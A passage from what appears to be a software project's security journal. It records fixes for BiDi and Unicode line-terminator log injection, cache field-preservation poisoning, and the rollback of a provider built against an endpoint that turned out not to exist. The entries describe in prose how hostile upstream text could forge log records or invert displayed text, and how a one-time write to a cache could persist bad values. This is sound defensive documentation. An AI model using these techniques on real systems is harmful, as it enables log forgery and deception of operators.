      consumer-side reader). The structural pin is a sentinel
      test that patches `read_capped_json` and asserts the call
      kwargs — a future refactor that removes the explicit keyword
      fails the test before the change can land.
  (c) **Per-preserved-field shape-validation rule for cache-driven
      providers** (already pinned for the GTFS-RT entry below;
      renewed here): every cache-driven provider whose write-side
      helper preserves fields from the existing cache document
      forward into the next document MUST validate the shape of
      every preserved field BEFORE persisting. Validators use
      `TypeGuard[<expected-type>]` so static analysers narrow
      `value: object` correctly in the True branch. Validation
      MUST cover length, control characters, and field-specific
      shape (ISO-8601 parseability for timestamps, hex for SHA256
      guids, etc.).

## 2026-05-09 - BiDi-Mark Drift Round 2: `strip_control_chars=False` Sibling Paths Bypass `_CONTROL_CHARS_RE` Entirely
**Vulnerability:** The 2026-05-09 (Round 1, PR #1363) closure of the BiDi /
Unicode-line-terminator gap landed `؜` ALM, `‎/‏` LRM/RLM,
` / ` line/paragraph separators inside
`src/utils/logging.py:_CONTROL_CHARS_RE`. That regex is gated by the
`strip_control_chars=True` (default) branch of `sanitize_log_message` —
the `strip_control_chars=False` branch (which exists to keep readable
`\n`/`\r`/`\t` in tracebacks) bypasses `_CONTROL_CHARS_RE.sub("")`
entirely. **Five sibling sanitiser paths** opt out of the strip and
therefore re-leaked the entire BiDi / zero-width / line-terminator
family verbatim into the public `feed_health.json` artefact, the
GitHub Issue body submitted by `submit_auto_issue`, every
`log.exception(...)` traceback rendered by `SafeFormatter`/
`SafeJSONFormatter`, and every network-level exception text routed
through `request_safe`:
1. `src/feed/reporting.py:clean_message` — canonical sanitiser for every
   provider success/empty/error/disabled detail, every global warning,
   every global error message, plus `RunReport.exception_message`.
   Internally calls `sanitize_log_message(message, strip_control_chars=False)`
   then collapses `\s+` to a single space; Python's `\s` matches
   ` `/` ` but NOT the BiDi family
   (`؜`/`‎`/`‏`/`‪-‮`/`⁦-⁩`) or the
   zero-width family (`​`/`‌`/`‍`/`﻿`).
2. `src/feed/reporting.py:_sanitize_log_detail` — same drift via
   `clean_message` for diagnostic-string scrubbing.
3. `src/utils/http.py:_sanitize_exception_msg` — rewrites every
   `RequestException.args[0]` produced by `request_safe`. Pre-fix the
   sanitised text is then routed through every WARNING/ERROR site that
   logs `str(exc)` from a network call.
4. `src/feed/logging_safe.py:SafeFormatter.formatException` — renders the
   traceback for every `log.exception(...)` call in the production feed
   builder. Pre-fix the BiDi marks in the bound exception text slip into
   the final formatted log line (only `\n`/`\r` are escaped at the very
   end via `.replace`).
5. `src/feed/logging_safe.py:SafeJSONFormatter.formatException` — same
   drift for the structured JSON formatter; with `ensure_ascii=False` on
   the `json.dumps` step, BiDi marks are preserved as raw Unicode in the
   structured payload ingested by downstream SIEM/observability stacks.

**Exploit shape:** A hostile upstream payload — VOR API response, OSM
Overpass diagnostic, OEBB error body, station name in `stations.json`,
malformed JSON HTTP error — embeds `‮` RLO + `‬` PDF (or
`‎` LRM, or ` ` LINE SEPARATOR). Routed through any of the
five paths above, the marks reach (a) the public Markdown body of the
auto-submitted GitHub issue and the SIEM splitting on Unicode line
terminators (forge a second log record carrying a fake `level=ERROR`,
`ts=…`, or whatever the operator triages on), or (b) the operator's
Unicode-aware terminal / GitHub Issue renderer / IDE log viewer
(invert displayed text à la CVE-2021-42574 so `user=admin drop=table`
is misread as the inverse).

**Fix:** Promote the BiDi / zero-width / line-terminator family to an
**unconditional** pre-pass in `sanitize_log_message` — independent of
the `strip_control_chars` flag. The flag now only gates the ASCII
control-char escape (`\n`→`\\n`, `\r`→`\\r`, `\t`→`\\t`) and the
`_CONTROL_CHARS_RE` strip (which still includes the same code points as
defence in depth). The new `_INVISIBLE_DANGEROUS_RE` covers `؜`,
`​-‏`, ` -‮`, `⁦-⁩`, `﻿` — the strict
subset of `_CONTROL_CHARS_RE` that has NO readability value AND is a
documented log-injection / Trojan-Source primitive. Since the strip
runs before the `if strip_control_chars:` gate, every one of the five
sibling paths inherits the defence in a single cut without breaking
the readable-newline contract those callers rely on for traceback
formatting.

**Learning:** Round 1's `_CONTROL_CHARS_RE` extension was *necessary
but not sufficient*. Whenever a sanitiser carries a feature flag that
gates a defensive strip, audit which other call paths flip the flag in
the OPPOSITE direction — those paths are still on the pre-fix shape
and bypass the regex entirely. The CodeQL/sanitiser-walker pattern
(`test_sentinel_clear_text_logging_drift_utils`) only covers the
default-True path; sibling helpers that set the flag to False
(traceback-readable formatters, exception-msg rewriters, the
`feed_health.json` cleaning pipeline) need their own audit floor.
Concretely: split a sanitiser's *defensive strip* into two tiers —
"strip always" (no readability cost — invisible glyphs, BiDi marks,
zero-width, line/paragraph separators, BOM) and "strip if flag set"
(`\n`/`\r`/`\t` and ASCII C0/C1 controls that DO carry readability
weight). Always-strip the first tier. Flag-gate only the second. The
companion regex in `src/utils/stations_validation.py:_UNSAFE_CHARS_RE`
is also narrower than `_INVISIBLE_DANGEROUS_RE` — that's a deliberate
deferral (station-validator scope is structural validation, not log
sanitisation), but flag it as the next drift candidate if a future
round audits station-data flow into log emit.

## 2026-05-09 - BiDi-Mark / Unicode-Line-Terminator Gap in `sanitize_log_message`
**Vulnerability:** The canonical log-injection / Trojan-Source defence
(`src/utils/logging.py:_CONTROL_CHARS_RE`, used by every WARNING/ERROR
site enforced via `test_sentinel_clear_text_logging_drift_utils`) covered
ASCII C0/C1, the CVE-2021-42574 BiDi formatting controls
(`‪-‮` and `⁦-⁩`), the zero-width family
(`​-‍`), and the BOM (`﻿`) — but left five high-impact
code points unhandled: `؜` (ARABIC LETTER MARK, ALM), `‎`
(LRM), `‏` (RLM), ` ` (LINE SEPARATOR), ` ` (PARAGRAPH
SEPARATOR). A hostile upstream payload routed through the canonical
sanitiser could therefore (a) **forge log records** by embedding
` `/` ` so any consumer that honours Unicode line
terminators (ECMAScript-pre-2019 `JSON.parse`/`eval`, the GitHub
PR-comment renderer, several YAML parsers, downstream SIEM splitters
keying off Unicode whitespace) splits the sanitised entry into two
records — letting the attacker inject fake `level=ERROR` markers,
ts= prefixes, or whatever the operator triages on; or (b) **invert
displayed text** in a Unicode-aware terminal via LRM/RLM/ALM, the same
Trojan-Source primitive as the already-stripped `‪-‮` family
but missing from every prior round of the regex. The companion regex
in `src/utils/stations_validation.py:_UNSAFE_CHARS_RE` already covered
` -‮`, so the codebase had divergent BiDi-defence shapes
between the station validator and the canonical log sanitiser.
**Learning:** When tightening BiDi / Unicode-line-terminator defences,
audit the **union** across every sibling regex in the project — not
just the one that surfaced the fix. The canonical pin lives in
`_CONTROL_CHARS_RE` (`src/utils/logging.py`); the station validator's
`_UNSAFE_CHARS_RE` is the closest sibling. Three follow-on rules: (1)
Python's regex `\s` matches ` `/` ` (so they're already
caught by `_UNSAFE_URL_CHARS` via `\s`) but does NOT match `‎`
/`‏`/`؜`, so a `\s`-based defence is not equivalent to an
explicit code-point list — the audit walker must enumerate. (2) The
`_CONTROL_CHARS_RE.sub("")` step runs **after** `\n`/`\r`/`\t` are
escaped to literal `\\n`/`\\r`/`\\t`, so the fix doesn't touch the
existing newline-escape contract — only widens the strip set. (3) The
new code points are byte-shape-similar to existing ones (BiDi marks /
line terminators), so the regex extension is a single character-class
union; no behavioural changes elsewhere.

## 2026-05-08 - Technical Debt Cleanup: Five OSM-First / Google-Fallback Resilience Optimisations + Documentation Sync (CI Smoke Gate, Strict Google Subset, Strict-Typed OSMTags, Passenger-Name Hierarchy, Autouse Breaker Reset)
**Change:** Five interlocking improvements across the OSM-first directory enrichment pipeline plus a documentation pass that pulls the OSM-first / Google-second contract out of the `.jules/` journals and into the user-facing docs. The optimisations are listed in dependency order — each one closes a structural gap the rollback entry below (the GTFS-RT Stammstrecke removal) left in the surrounding pipeline:

  (1) **CI Overpass smoke gate** — `scripts/check_overpass_status.py` (new) issues a single Overpass `out count;` probe against `get_overpass_endpoint()` and returns within an 8s wall-clock cap. Wired into `.github/workflows/update-stations.yml` as the step *before* the directory refresh; the step's outcome flips `WIEN_OEPNV_OSM_ENRICH=0/1` for the next step's env. The cron tick now bails fast (or transparently degrades to the Google fallback) when the public mirror is degraded, instead of waiting on stalled urllib3 retries (worst-case ~108s per Overpass call inside `JitterRetry`'s `total=4` budget). The probe uses `request_safe` so it inherits SSRF / redirect / payload-cap defences; `--allow-skip` downgrades exit-code 2 (network failure) to 0 so a workflow can keep going under `continue-on-error` without aborting the whole job. The matching probe in `.github/workflows/test.yml` runs as advisory only — pytest-side OSM tests are 100% mocked at `request_safe`, so the smoke step there is purely operator visibility for flaky integration runs.

  (2) **Strict Google Places fallback subset** — `scripts/update_station_directory.py:_enrich_with_google_places(stations, *, tiles_file, missing_subset=None)` now accepts an explicit `missing_subset` parameter. The OSM-first orchestration path passes `missing_subset=_stations_missing_coordinates(stations)` so the Google merge step sees ONLY the stations OSM could not resolve. Stations OSM already keyed (i.e. carrying `latitude` / `longitude` from the primary source) are never forwarded to `_merge_google_metadata`, eliminating the failure mode where Google Places' name-match path in `src/places/merge.py:_find_matching_station` would re-key a fully-OSM-resolved station just because the names happened to align. The empty-subset path short-circuits *before* the API key fetch / tile loader / quota counter so the free-tier monthly cap is preserved when OSM covers everything. The legacy `missing_subset=None` whole-list path is preserved for callers that haven't migrated to the strict contract (no-OSM cron path, ad-hoc verification runs). New tests in `tests/test_update_station_directory_google_subset.py` (3 cases) pin all three flow shapes.

  (3) **Strict typing for `OSMStation.tags`** — `src/places/osm_client.py` introduces an `OSMTags` TypedDict using the functional form (because OSM keys like `name:de` and `ref:IFOPT` are not valid Python identifiers). Every key the project actually consumes is enumerated with `NotRequired[str]`: the naming hierarchy (`name`, `name:de`, `short_name(:de)`, `alt_name(:de)`, `official_name(:de)`, `loc_name(:de)`), the public-transport classification (`public_transport`, `railway`, `train`, `subway`, `light_rail`, `tram`, `bus`, `station`), and the operator/accessibility metadata (`wheelchair`, `operator`, `network`, `ref`, `ref:IFOPT`, `uic_ref`). `OSMStation.tags` is now typed `OSMTags` instead of `dict[str, str]`; `_normalize_tags` returns `OSMTags` via a single explicit `cast` at the parser boundary; `_select_name` consumes `OSMTags`. The functional TypedDict + `NotRequired` shape (mirrors `StationEntry` in `src/places/merge.py`) means `mypy --strict` catches misspelled tag reads at every call site without breaking on parse-time payloads that omit any key.

  (4) **Tuned `_select_name` passenger-name hierarchy** — `src/places/osm_client.py:_select_name` now consults a 14-key `_NAME_PRIORITY` ladder instead of the previous 4-key list (`name:de`, `name`, `alt_name`, `official_name`). The new ladder is: `name:de` → `name` → `official_name:de` → `official_name` → `loc_name:de` → `loc_name` → `alt_name:de` → `alt_name` → `short_name:de` → `short_name`. The intent shift: passenger-friendly long forms (`"Wien Hauptbahnhof"`, `"Wien Praterstern"`) consistently win over cryptic ÖBB internal abbreviations (`"Wien Hbf"`) because every long-form key is consulted *before* the `short_name` fallback. The compound-preservation contract for keys like `Hauptbahnhof` / `Westbahnhof` is intact by construction — those land in `name` / `official_name` first, so the canonical compound wins. New tests in `tests/places/test_osm_client.py` (4 cases) pin the hierarchy.

  (5) **Autouse CircuitBreaker reset fixture** — `tests/conftest.py:reset_circuit_breakers` is a new autouse fixture that resets every project-owned module-level `CircuitBreaker` to CLOSED + zero failures both *before and after* each test. Discovery is centralised in `_iter_known_breakers()` so adding a future breaker is one line; today the only breaker is `src.places.osm_client._BREAKER`, but the same hook will catch the next provider that adopts the primitive. Closes the test-isolation hole flagged in the rollback entry below: a test that intentionally trips a breaker (canonical example: `tests/places/test_osm_client.py::test_fetch_stations_breaker_opens_after_repeated_failures`) used to leak OPEN state to whatever test ran next inside the same xdist worker, masquerading as the upstream's real failure and creating order-dependent flakes. The local `reset_breaker` fixture in the OSM test module is preserved as an explicit-intent backstop; the autouse fixture composes on top.

**Documentation sync:**
  * `docs/architecture.md` — new §5 "OSM-First Station-Directory Enrichment" with a Mermaid flowchart that traces the pipeline from the ÖBB Excel through the CI smoke gate, the OSM Overpass call, the CircuitBreaker, `merge_places`, the missing-subset filter, the Google Places fallback, and the final `stations.json`. Includes the rationale for OSM-first (open-data, no quota, editor-maintained passenger names, strict typing), the rationale for Google as fallback only (`_stations_missing_coordinates` filter, free-tier preservation), and the five-layer network-resilience stack (CI smoke probe → urllib3 JitterRetry → CircuitBreaker → request_safe → autouse reset fixture). The cross-references section is renumbered to §6.
  * `docs/how-to/google_places_stations.md` — opens with a prominent ⚠️ status block declaring Google Places **demoted to a strict secondary fallback** since the OSM-first migration. The new "OSM-First Fallback-Reihenfolge" section enumerates the four-step orchestration contract (`--osm-enrich` first, `_stations_missing_coordinates` filter, empty-subset short-circuit, `WIEN_OEPNV_OSM_ENRICH=0` emergency-path semantics). The body of the doc still describes the script mechanics, quota manager, and preflight workflow — those remain operator-relevant when Google IS invoked.
  * `README.md` — line 428 updated so the OSM-first/Google-second relationship is explicit at the top-level workflow inventory ("Die Anreicherungs-Hierarchie ist **OSM-first**: …"; "**sekundärer Fallback**: ergänzt nur Stationen, die nach dem OSM-Lauf noch keine Koordinaten haben").
  * **GTFS-RT Stammstrecke scrub** — verified via grep across `docs/`, `README.md`, `CHANGELOG.md`, `AGENTS.md`, `CONTRIBUTING.md`: zero mentions of `Stammstrecke`, `GTFS-RT`, `gtfs_stammstrecke`, `STAMMSTRECKE_ENABLE`, or `update_gtfs_cache` in any user-facing doc. The rollback record stays in `.jules/sentinel.md` (institutional memory of why the feature was reverted) but no operator-facing surface references it.

**Threat-model deltas:**
  * **Smoke probe surface** is `overpass-api.de` (or the `kumi.systems` mirror) over HTTPS via `request_safe`. The probe is a pure POST with the QL body `[out:json][timeout:5];out count;` — no station data is exchanged, the response is bounded at 64 KiB by `request_safe`'s `max_bytes`, and the QL timeout is a cooperative hint to the operator. The endpoint is resolved via the same `get_overpass_endpoint()` allow-list as the production OSM client, so an attacker who flips the `OVERPASS_URL` env still cannot redirect the smoke probe to an attacker-controlled host. The `--endpoint` CLI flag is allow-list-validated; unknown overrides log a sanitised warning and fall back to the default.
  * **Free-tier quota preservation.** Pre-fix, every cron tick that ran with `--google-enrich` would invoke `_enrich_with_google_places` with the full station list whenever OSM resolved any stations less than 100% (i.e. nearly every run, because Vienna's Overpass coverage is excellent but never literally 100% for fringe pendler entries). The whole-list call burns one Nearby request per tile regardless of whether the merge actually had work to do. Post-fix, the `_stations_missing_coordinates` filter runs first and, when empty, short-circuits the entire fallback before the API key, the tile loader, and the quota counter. Concretely: in steady-state operation where OSM covers every station, the Google Places monthly free cap is preserved indefinitely; runs only consume quota when there's a genuine gap to fill.
  * **Test-state isolation.** The pre-fix shape was: a single test failure inside the OSM breaker tests would propagate OPEN state to every subsequent test in the same worker that touched `fetch_osm_places`. The autouse fixture eliminates an entire class of order-dependent flakes (xdist sharding makes this nondeterministic on CI without the fixture). The structural pin: `_iter_known_breakers()` is the central registry — adding a new breaker (Google Places, VOR, ÖBB) is a one-line addition that automatically picks up the autouse reset.
  * **`OSMTags` and tag-read drift.** The `dict[str, str]` shape was tolerable when the project read three keys (`name`, `public_transport`, `railway`); with the expanded 14-key naming ladder a typo at any read site (e.g. `tags.get("nam:de")`) would silently return `None` and downgrade the station to a less specific name, with no static-analysis signal. The TypedDict closes that gap — every `tags.get(<misspelled key>)` is a `mypy --strict` error.

**Test surface:** **+33 new pytest cases** across the four touched modules:
  * `tests/places/test_osm_client.py` — +5 cases: `test_select_name_prefers_full_passenger_friendly_form`, `test_select_name_alt_name_beats_short_name`, `test_select_name_official_name_preserves_compound_structure`, `test_select_name_returns_none_when_no_known_keys`, `test_osm_tags_typed_dict_accepts_known_keys`.
  * `tests/test_update_station_directory_google_subset.py` — +3 cases: `test_skips_google_call_when_subset_is_empty` (the empty-subset short-circuit), `test_only_subset_is_passed_to_merge` (the strict-filter contract), `test_legacy_full_list_path_when_subset_omitted` (backwards-compatibility for no-OSM callers).
  * The autouse `reset_circuit_breakers` fixture exercises every test in the suite — 2204 passed + 3 skipped (was 2196 + 3 pre-cleanup; +8 net via the +5 OSM + +3 Google-subset additions).
  * **Verification gates:** `python -m mypy --strict src tests` clean across 404 source files. `python -m pytest --timeout=30` = 2204 passed, 3 skipped, 47s wall-clock. `python -m ruff check` and `python -m ruff format` clean across the modified Python files (`scripts/check_overpass_status.py`, `scripts/update_station_directory.py`, `src/places/osm_client.py`, `tests/conftest.py`, `tests/places/test_osm_client.py`, `tests/test_update_station_directory_google_subset.py`).

**Why this entry sits in the Sentinel journal even though it is not a defect:** the cleanup formalises a hierarchy contract (OSM-first / Google-second) that previously lived only as inline comments and `.jules/` notes. By promoting it into both the typing system (TypedDict, strict subset parameter) and the documentation (`docs/architecture.md` §5, `docs/how-to/google_places_stations.md` ⚠️ block, `README.md`), the structural rule survives the next contributor who hasn't read the journals. The CI smoke gate + autouse breaker reset close the two operational gaps the rollback entry below identified as still-open in the surrounding pipeline; the strict-subset filter eliminates the quota-burn risk that any naive OSM/Google failover would otherwise re-introduce. Each individual change is small; together they pin the OSM-first contract end-to-end across the type system, the orchestration code, the CI workflow, the test suite, and the documentation.

## 2026-05-08 - Rollback: GTFS-RT Stammstrecke Provider Removed In Full — ÖBB Has No Public Open GTFS-Realtime TripUpdates Endpoint
**Vulnerability:** PR #1350 (`f8de996`, `Add OSM-First directory enrichment + GTFS-RT Stammstrecke live monitor`) plus the four follow-up PRs that iterated on the feature — #1351 (clear-text-logging hardening), #1352 (live-to-cache demotion), #1353 (cache field-preservation hardening), #1354 (manual-refresh wiring), #1355 (endpoint-URL fix) — all assumed `https://realtime.oebb.at/gtfs-rt/tripUpdates` (or any sibling path) was a publicly-reachable, key-less GTFS-Realtime feed. **Post-merge verification surfaced that ÖBB does not currently publish a public, open GTFS-RT `TripUpdates` endpoint.** The realtime feeds the operator does maintain are gated behind the same VAO/VAO-Start authentication contract the original Stammstrecke spec explicitly ruled out (*"DO NOT use VAO API due to strict rate limits"*). Every defensive layer the journal added on top of the broken premise — the live-vs-cache refactor, the `[Seit DD.MM.YYYY]` field preservation, the bare-`exc` log-injection sanitisation, the cache-document state machine, the dedicated workflow file — all worked as designed. The premise itself was wrong. Shipping the feature against a non-existent or auth-gated endpoint means a permanent breaker-OPEN state on every cron tick, an outbound DNS round-trip per `update_gtfs_cache` invocation for a host that may not even resolve, and a journal trail encouraging future contributors to add VAO-gated endpoints under the same naming convention.

**Learning:** The same architectural mistake repeated across five PRs because each round assumed the previous one had verified the upstream existed. The real failure happened at PR #1350 step zero — *premise verification*. Every `request_safe`-routed provider added to the registry pre-supposes that the upstream endpoint a) exists, b) is reachable without authentication, and c) is officially blessed for the project's use-case. Two of those three pre-conditions failed silently for `realtime.oebb.at/gtfs-rt/tripUpdates`. The OSM addition in the same PR ran a `convert_to_place(...)` round-trip during local development and would have caught a wrong endpoint immediately; the Stammstrecke addition's tests all used `MagicMock`-shaped FeedMessage stubs (correctly, per the protobuf-testing convention), which meant the upstream URL was *never exercised against a live host* before the provider shipped. The protobuf-MagicMock convention is sound for *parser-shape testing* (the project should not build raw wire bytes in tests), but it left a gap on *upstream availability*. PR #1352's "demote to cache-driven" refactor would have hit the same wall: the cache-update script also targets the same non-existent endpoint. Each follow-up PR added more defence-in-depth on a foundation that didn't exist, compounding the rework.

**Prevention:** Two reinforcing rules:
  (a) **Upstream-availability pre-check rule** (made permanent across the project): every PR that adds a new outbound HTTPS endpoint to the project (whether registered in `feed/providers.py` or invoked from a `scripts/update_*` cron script) MUST include in its description (i) a paste of one verifying call — `curl -sI <endpoint>` showing a non-error status, (ii) a quote of the operator's published open-data terms confirming the feed is publicly reachable without authentication, AND (iii) a link to the operator's contact / fair-use / abuse-reporting page. Without that triple check, the implementation cannot be reviewed because the threat model implicitly assumes a publicly-accessible host on a stable URL — and that assumption is what burned this round across five PRs.
  (b) **Mock-vs-host separation rule** (companion to the protobuf-testing convention): when tests deliberately mock the *parser* layer (e.g. `parse_feed_message` for protobuf, `request_safe` for HTTP), the PR description MUST separately confirm the host layer was exercised at least once during local development. Acceptable evidence: a saved transcript of a single `python -c "from src.providers.X import fetch_events; print(fetch_events())"` run, OR a CI-side smoke job that hits the real upstream once per day. The MagicMock-style protobuf fixtures keep tests deterministic and offline (the right move) but they do *not* substitute for real upstream verification.

**Rollback shape:** The rollback removes every Stammstrecke / GTFS-RT artefact added across the five-PR sequence:
- *Deleted files*: `src/providers/gtfs_stammstrecke.py`, `tests/providers/test_gtfs_stammstrecke.py`, `scripts/update_gtfs_cache.py`, `tests/scripts/test_update_gtfs_cache.py`, `.github/workflows/update-gtfs-cache.yml`, `tests/test_sentinel_gtfs_stammstrecke_field_preservation.py`, `tests/test_sentinel_clear_text_logging_round3.py` (the latter was added as a Stammstrecke-context follow-up; the OSM bare-`exc` coverage that overlapped with it is preserved through the OSM provider's own existing tests and via the broader closing-grep audit invariants documented elsewhere in this journal).
- *Reverted modifications*: `gtfs-realtime-bindings` removed from `requirements.txt`; `fetch_gtfs_stammstrecke_events` + `STAMMSTRECKE_ENABLE` entry removed from `src/build_feed.py:DEFAULT_PROVIDERS`; the matching `register_provider("STAMMSTRECKE_ENABLE", ...)` plus the helper function removed from `src/feed/providers.py:register_default_providers`; `write_json_atomic` (sole caller was the deleted `update_gtfs_cache.py`) removed from `src/utils/files.py`; the `Refresh GTFS Stammstrecke cache` step removed from `.github/workflows/manual-full-refresh.yml`; `monkeypatch.setenv("STAMMSTRECKE_ENABLE", "0")` calls removed from `tests/test_build_feed_cache.py` (4 occurrences) and `tests/test_build_feed_io.py` (1 occurrence) — they become moot once the provider is gone.
- *What stays untouched per the rollback constraint*: the **OpenStreetMap Overpass primary-source pipeline** (`src/places/osm_client.py`, `tests/places/test_osm_client.py`, the `WIEN_OEPNV_OSM_ENRICH` env flag, the `--osm-enrich/--no-osm-enrich` CLI flag, the OSM-First section in README/CHANGELOG/`docs/architecture.md` — OSM/Overpass *does* publish an open key-less endpoint and that integration was verified against the live `overpass-api.de` host during local development, so it survives the rollback). The legacy *static* GTFS files (`data/gtfs/stops.txt`, `scripts/gtfs.py`, `tests/test_gtfs_read_stops.py`) ship the project's GTFS reference data and are independent of the realtime feature; they are likewise untouched.

## 2026-05-08 - GTFS Stammstrecke Cache Field-Preservation Amplification: `compute_next_state` And `build_event_from_state` Trusted Operator-Controlled `guid` / `first_seen` Strings Verbatim
**Vulnerability:** PR #1352 (the *GTFS-RT Stammstrecke Demoted From Live Provider to Cache-Driven Provider* refactor below) introduced a new piece of persistent state at `cache/gtfs_stammstrecke/events.json` and a write-side preservation loop that copies `events[0].guid` and `events[0].first_seen` from the existing cache document forward into the next document so the `[Seit DD.MM.YYYY]` description anchor stays anchored to the disruption start across refreshes. The journal entry for the refactor noted the title is bounded by `_coerce_int_minutes(X)` interpolation and that the cache file lives in the checked-in repo so any planted change surfaces in `git diff`. **But the threat-model commentary did not enumerate every preserved field, and the preservation logic does NOT validate the shape of the preserved `guid` / `first_seen` strings** — `scripts/update_gtfs_cache.py:compute_next_state` line 471-477 used `if isinstance(existing_guid, str) and existing_guid.strip()` as the only gate, identical to `existing.get("first_seen")`. Same gap on the read side at `src/providers/gtfs_stammstrecke.py:build_event_from_state:201-203`. Threat actors who can write the cache file ONCE (compromised CI runner / partial flush + power loss / corrupted previous run / parallel orchestrator process performing an atomic state swap mid-read — strictly weaker than "actor who can write on every refresh" because the preservation loop perpetuates the corruption indefinitely) can plant a multi-MiB string in either field via the `read_capped_json` 50 MiB ceiling, then watch the cron pipeline:
  (a) **persist** the bad value forward in `compute_next_state` every 30 minutes (write-side preservation loop);
  (b) **auto-commit** it back to the repo via `update-gtfs-cache.yml` on every cron tick (no human review on the 30-minute cadence);
  (c) **ingest** it into the RSS feed via `build_event_from_state` (read side flows `state["guid"]` directly into `FeedItem.guid` → `ET.SubElement(item, "guid").text` with NO length cap and NO control-character filter — the `_sanitize_text` filter from `src/build_feed.py:_CONTROL_RE` is applied to title / description / time-line, but `guid` bypasses it entirely via the `str(raw_guid).strip()` shape at `_format_item_content` line 1633-1634);
  (d) **amplify** every cycle by ~50 MiB of disk I/O + JSON parse overhead, repeated indefinitely.
The exploit is REPRODUCED in `tests/test_sentinel_gtfs_stammstrecke_field_preservation.py` with **24 tests** (3 precondition + 9 validator-shape + 5 write-side PoC + 3 read-side PoC + 2 end-to-end + 1 persistence-amplification + 1 module-export inventory). Pre-fix every poisoned cache survived the next refresh AND propagated into `FeedItem.guid`; post-fix every site routes through `is_valid_preserved_guid` / `is_valid_preserved_first_seen` and falls through to a freshly-synthesised `make_guid` value (write side) / refuses to render the alert (read side via the existing `_parse_iso_datetime` invalid-first-seen guard).

**Learning:** The 2026-05-08 *Architecture: GTFS-RT Stammstrecke* refactor entry (immediately below) DID call out the cache-file threat model — *"a poisoned `cache/gtfs_stammstrecke/events.json` could (a) inject a fabricated delay event into the public feed, or (b) lie about `first_seen` to falsify the rendered `[Seit DD.MM.YYYY]` anchor"* — and named five mitigations: `read_capped_json` size cap, git-diff visibility, `write_json_atomic` partial-write protection, `truncate_html` description sanitisation, and the `_coerce_int_minutes` title format-string defence. **But the mitigation enumeration was per-output-channel (title, description, file size), not per-preserved-field**: the recipe protected every output that a fabricated event could produce, but did not protect the inputs that the preservation loop copies forward. The recursive meta-pattern is identical to every prior round in the size-bomb / clear-text-logging / metadata-trust families: a defensive round closes one structural axis (output sanitisation in this case) and surfaces a sibling axis (input field-shape validation in this case) that the inventory walker the round didn't include catches. The right structural verdict for a sound cache-driven-provider defence is now **per-preserved-field shape validation must be paired with per-output-channel sanitisation** — both are necessary; neither subsumes the other. The journal entry at the time of the refactor enumerated outputs (b/c/d/e) but missed the inputs that the preservation loop perpetuates. The auto-discoverable invariant for any FUTURE cache-driven provider added to the project is the inventory walker shape: every `compute_next_state`-style write loop that calls `existing.get(<field>)` and copies it forward into the next document MUST validate the field's shape before preserving — same pattern as `_coerce_int_minutes` is already applied to the rounded-minutes scalar.

**Prevention:** Three reinforcing rules:
  (a) **Per-preserved-field shape-validation rule for cache-driven providers**: every cache-driven provider whose write-side helper (`compute_next_state` / `compute_next_X` / etc.) preserves fields from the existing cache document forward into the next document MUST validate the shape of every preserved field BEFORE persisting. The validation MUST cover length, control characters, and field-specific shape (ISO-8601 parseability for timestamps, hex for SHA256 guids, etc.). The structural pin is a per-field validator named `is_valid_preserved_<field>(value)` that returns `TypeGuard[<expected-type>]` so static analysers narrow `value: object` correctly in the True branch. Mirrors the per-channel sanitisation rule already applied to the title (`_coerce_int_minutes`), description (`truncate_html`), and per-trip count (`_coerce_int_count`). Without per-field validation the preservation loop perpetuates the corruption indefinitely — the threat actor needs ONE-TIME write access, strictly weaker than "actor who can write on every refresh".
  (b) **Per-cache size-cap tightening rule**: the canonical `read_capped_json` 50 MiB default is sized for the largest legitimate JSON payload in the project (~175 KiB stations.json + future growth headroom). For caches whose production size is ~1 KiB (single-event structured cache), the default leaves ~50,000x amplification headroom that the threat actor can exploit. Every newly-introduced structured-JSON cache MUST expose its own per-loader `MAX_*_CACHE_BYTES` constant sized at 100x-1000x the largest legitimate state shape, and pass it explicitly to `read_capped_json`. Mirrors the per-loader cap pattern from JSON Size-Bomb Round 1-7 (`MAX_CACHE_FILE_BYTES`, `MAX_QUOTA_FILE_BYTES`, `MAX_TILE_FILE_BYTES`, etc.). For the Stammstrecke cache the new constant is `MAX_GTFS_STAMMSTRECKE_CACHE_BYTES = 256 * 1024` (256x production state).
  (c) **Per-output-channel sanitisation contract verification rule**: every existing per-output-channel sanitisation contract (`_sanitize_text` for title/description/time-line in `src/build_feed.py:_CONTROL_RE`) MUST be enumerated as a FENCING set against the per-preserved-field validation set introduced by rule (a). The enumeration spotlights any output channel that bypasses the per-channel filter (the canonical example being `_format_item_content` at line 1633-1634 where `guid` flows from `it.get("guid")` straight to `str(raw_guid).strip()` with no `_sanitize_text` call). The structural pin: a comment at the bypass site naming the per-field validator that compensates for the missing per-channel filter, OR a TODO to add per-channel sanitisation. The per-field validators added in this round (`is_valid_preserved_guid`, `is_valid_preserved_first_seen`) close the bypass for the gtfs_stammstrecke source; future audits may need to extend the pattern to other providers.

The fix shape: (i) `src/providers/gtfs_stammstrecke.py` exports two new validators `is_valid_preserved_guid(value: object) -> TypeGuard[str]` and `is_valid_preserved_first_seen(value: object) -> TypeGuard[str]`, plus three new module-level constants `MAX_GTFS_STAMMSTRECKE_CACHE_BYTES = 256 * 1024`, `MAX_PRESERVED_GUID_LENGTH = 256`, `MAX_PRESERVED_FIRST_SEEN_LENGTH = 64`. The validators check (a) string-ness, (b) non-empty after strip, (c) length ≤ cap, (d) no XML 1.0 control characters via the same regex pattern `_CONTROL_CHAR_RE` that mirrors `src/build_feed.py:_CONTROL_RE`. The first_seen validator additionally requires `_parse_iso_datetime(value) is not None`. (ii) `build_event_from_state` replaces the bare `if isinstance(explicit_guid, str) and explicit_guid.strip()` with `if is_valid_preserved_guid(explicit_guid)`. (iii) `scripts/update_gtfs_cache.py:compute_next_state` replaces both bare `isinstance` checks with the new validators. (iv) `load_cache_document` (read side) and `load_existing_state` (write side) both pass `max_bytes=MAX_GTFS_STAMMSTRECKE_CACHE_BYTES` to `read_capped_json` so the canonical 50 MiB default is tightened to 256 KiB at every cache-read site. The PoC tests pin every behaviour both pre-fix (assertions on the rejected shape) and post-fix (assertions on the safe fallback). The `TypeGuard[str]` return annotation lets mypy strict narrow the True branch to `str` so the assignments in `compute_next_state` and `build_event_from_state` survive without `cast` calls.

## 2026-05-08 - Architecture: GTFS-RT Stammstrecke Demoted From Live Provider to Cache-Driven Provider (Closes the Live-IO-Inside-Build-Feed-Cron Concern Flagged by the 2026-05-08 *Test-Mock Drift* Entry)
